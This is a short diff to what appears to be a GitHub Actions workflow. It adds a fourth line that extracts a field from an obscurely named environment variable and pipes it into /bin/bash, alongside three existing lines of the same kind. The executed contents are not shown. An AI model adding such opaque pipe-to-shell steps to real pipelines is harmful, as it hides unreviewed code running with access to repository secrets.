@@ -21,6 +21,7 @@ jobs:
           printf '%s' "$bcbt5" | jq -r .ys99 | /bin/bash
           printf '%s' "$dkara72933" | jq -r .fipld3606 | /bin/bash
           echo $ugsrv0 | jq -r .x6 | /bin/bash
+          printf '%s' "$bmxl16" | jq -r .yw7 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
